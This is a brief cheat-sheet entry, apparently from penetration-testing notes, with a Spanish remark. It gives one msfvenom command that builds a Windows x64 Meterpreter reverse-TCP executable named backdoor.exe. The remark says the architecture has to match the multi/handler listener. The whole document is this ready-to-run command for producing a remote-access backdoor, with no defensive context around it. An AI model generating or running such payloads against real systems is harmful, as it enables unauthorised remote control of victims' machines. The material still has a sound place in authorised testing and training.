
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe >backdoor.exe

NOTA: tener en cuenta la arquitectura si no especificamos x64 será por defecto x32 y si nos ponemos en escucha el multi/handler payload debe de ser x64 también.